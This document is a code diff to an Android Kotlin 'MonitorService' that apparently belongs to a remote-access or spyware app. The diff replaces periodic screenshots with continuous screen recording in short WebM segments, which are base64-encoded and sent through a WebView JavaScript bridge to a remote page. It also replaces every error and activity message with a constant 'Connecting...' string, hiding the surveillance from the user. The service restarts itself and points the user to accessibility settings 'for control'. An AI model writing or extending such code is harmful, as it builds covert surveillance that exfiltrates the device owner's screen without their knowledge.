@@ -6,11 +6,9 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
-import android.graphics.Bitmap
-import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
-import android.media.ImageReader
+import android.media.MediaRecorder
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.net.http.SslError
@@ -31,13 +29,13 @@ import android.webkit.WebResourceRequest
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
-import java.io.ByteArrayOutputStream
+import java.io.File
 import java.net.URLEncoder
 
 class MonitorService : Service() {
 
     companion object {
-        var lastStatus: String = "Service started"
+        var lastStatus: String = "جاري الاتصال..."
         var lastBridgeTime: Long = System.currentTimeMillis()
         var projectionCode: Int = 0
         var projectionData: Intent? = null
@@ -52,9 +50,10 @@ class MonitorService : Service() {
 
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
-    private var imageReader: ImageReader? = null
+    private var mediaRecorder: MediaRecorder? = null
+    private var segFile: File? = null
+    private var segSeq = 0
     private var screenRunning = false
-    private var lastFrameTime = 0L
     private var deviceW = 720
     private var deviceH = 1600
 
@@ -63,6 +62,9 @@ class MonitorService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == "start_screen") {
             handler.post { startScreen() }
+        }
+        if (intent?.action == "stop_screen") {
+            handler.post { stopScreen() }
         }
         return START_STICKY
     }
@@ -85,7 +87,7 @@ class MonitorService : Service() {
         try {
             setupWebView()
         } catch (e: Exception) {
-            lastStatus = "WebView error: " + e.message
+            lastStatus = "جاري الاتصال..."
         }
         handler.postDelayed(watchdog, 20000)
     }
@@ -94,7 +96,7 @@ class MonitorService : Service() {
         override fun run() {
             val idle = System.currentTimeMillis() - lastBridgeTime
             if (idle > 60000) {
-                lastStatus = "Reconnecting..."
+                lastStatus = "جاري الاتصال..."
                 lastBridgeTime = System.currentTimeMillis()
                 try {
                     webView?.reload()
@@ -152,16 +154,11 @@ class MonitorService : Service() {
         webView!!.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                if (lastStatus == "Service started") {
-                    lastStatus = "Page loaded, waiting JS..."
-                }
             }
 
             override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                 super.onReceivedError(view, request, error)
-                if (request?.isForMainFrame == true) {
-                    lastStatus = "Page error: " + (error?.description?.toString() ?: "unknown")
-                }
+                lastStatus = "جاري الاتصال..."
             }
 
             override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
@@ -190,18 +187,13 @@ class MonitorService : Service() {
     }
 
     fun startScreen() {
-        if (screenRunning) {
-            lastStatus = "Screen already live"
-            return
-        }
+        if (screenRunning) return
         if (projectionData == null) {
             try {
                 val i = Intent(this, ProjectionActivity::class.java)
                 i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivity(i)
-                lastStatus = "Screen permission requested"
             } catch (e: Exception) {
-                lastStatus = "Screen request error"
             }
             return
         }
@@ -219,69 +211,111 @@ class MonitorService : Service() {
             mediaProjection!!.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
                     screenRunning = false
-                    lastStatus = "Screen stopped"
                     try {
                         virtualDisplay?.release()
                         virtualDisplay = null
                     } catch (e: Exception) {
                     }
-                    try {
-                        imageReader?.close()
-                        imageReader = null
-                    } catch (e: Exception) {
-                    }
                 }
             }, handler)
-            imageReader = ImageReader.newInstance(360, 800, PixelFormat.RGBA_8888, 2)
-            virtualDisplay = mediaProjection!!.createVirtualDisplay(
-                "scr", 360, 800, 160,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader!!.surface, null, null
-            )
-            imageReader!!.setOnImageAvailableListener({ reader ->
-                try {
-                    val now = System.currentTimeMillis()
-                    if (now - lastFrameTime >= 1500) {
-                        lastFrameTime = now
-                        val image = reader.acquireLatestImage()
-                        if (image != null) {
-                            val plane = image.planes[0]
-                            val buffer = plane.buffer
-                            val pixelStride = plane.pixelStride
-                            val rowStride = plane.rowStride
-                            val rowPadding = rowStride - pixelStride * 360
-                            val fullW = 360 + rowPadding / pixelStride
-                            val bmp = Bitmap.createBitmap(fullW, 800, Bitmap.Config.ARGB_8888)
-                            bmp.copyPixelsFromBuffer(buffer)
-                            image.close()
-                            val cropped = Bitmap.createBitmap(bmp, 0, 0, 360, 800)
-                            val out = ByteArrayOutputStream()
-                            cropped.compress(Bitmap.CompressFormat.JPEG, 55, out)
-                            bmp.recycle()
-                            cropped.recycle()
-                            val b64 = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
-                            handler.post {
-                                webView?.evaluateJavascript(
-                                    "upload('" + b64 + "','live_" + androidId + "_scr.jpg',function(ok){if(ok)cmd('Screen live');});",
-                                    null
-                                )
-                            }
-                        }
-                    } else {
-                        reader.acquireLatestImage()?.close()
-                    }
-                } catch (e: Exception) {
-                }
-            }, null)
             screenRunning = true
-            lastStatus = "Screen live"
+            startSegment()
         } catch (e: Exception) {
-            lastStatus = "Screen error: " + e.message
+            screenRunning = false
+        }
+    }
+
+    fun stopScreen() {
+        screenRunning = false
+        handler.removeCallbacks(segNextRunnable)
+        try {
+            mediaRecorder?.stop()
+        } catch (e: Exception) {
+        }
+        try {
+            mediaRecorder?.release()
+        } catch (e: Exception) {
+        }
+        mediaRecorder = null
+        try {
+            virtualDisplay?.release()
+        } catch (e: Exception) {
+        }
+        virtualDisplay = null
+    }
+
+    private fun startSegment() {
+        if (!screenRunning) return
+        try {
+            segSeq++
+            val f = File(cacheDir, "seg_$segSeq.webm")
+            segFile = f
+            val mr = MediaRecorder()
+            mediaRecorder = mr
+            mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
+            mr.setOutputFormat(MediaRecorder.OutputFormat.WEBM)
+            mr.setVideoEncoder(MediaRecorder.VideoEncoder.VP8)
+            mr.setVideoSize(360, 640)
+            mr.setVideoFrameRate(15)
+            mr.setVideoEncodingBitRate(200000)
+            mr.setOutputFile(f.absolutePath)
+            mr.prepare()
+            virtualDisplay = mediaProjection!!.createVirtualDisplay(
+                "scr", 360, 640, 160,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                mr.surface, null, null
+            )
+            mr.start()
+            handler.postDelayed(segStopRunnable, 3000)
+        } catch (e: Exception) {
+            handler.postDelayed(segNextRunnable, 2000)
+        }
+    }
+
+    private val segStopRunnable = object : Runnable {
+        override fun run() {
+            finishSegment()
+        }
+    }
+
+    private val segNextRunnable = object : Runnable {
+        override fun run() {
+            startSegment()
+        }
+    }
+
+    private fun finishSegment() {
+        try {
+            mediaRecorder?.stop()
+        } catch (e: Exception) {
+        }
+        try {
+            mediaRecorder?.release()
+        } catch (e: Exception) {
+        }
+        mediaRecorder = null
+        try {
+            virtualDisplay?.release()
+        } catch (e: Exception) {
+        }
+        virtualDisplay = null
+        val f = segFile
+        if (f != null && f.exists() && f.length() > 500) {
+            val b64 = Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)
+            f.delete()
+            handler.post {
+                webView?.evaluateJavascript(
+                    "if(window.segUploadNative)segUploadNative('scr','" + b64 + "');",
+                    null
+                )
+            }
+        }
+        if (screenRunning) {
+            handler.postDelayed(segNextRunnable, 300)
         }
     }
 
     private fun openAccessibilitySettings() {
-        lastStatus = "Enable Accessibility for control"
         try {
             val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
@@ -293,7 +327,7 @@ class MonitorService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         try {
-            virtualDisplay?.release()
+            stopScreen()
             mediaProjection?.stop()
         } catch (e: Exception) {
         }
@@ -313,18 +347,16 @@ class MonitorService : Service() {
         @JavascriptInterface
         fun onCommand(text: String) {
             lastBridgeTime = System.currentTimeMillis()
-            lastStatus = text
-        }
-
-        @JavascriptInterface
-        fun onUploadDone(text: String) {
-            lastBridgeTime = System.currentTimeMillis()
-            lastStatus = text
         }
 
         @JavascriptInterface
         fun startScreen() {
             handler.post { this@MonitorService.startScreen() }
+        }
+
+        @JavascriptInterface
+        fun stopScreen() {
+            handler.post { this@MonitorService.stopScreen() }
         }
 
         @JavascriptInterface
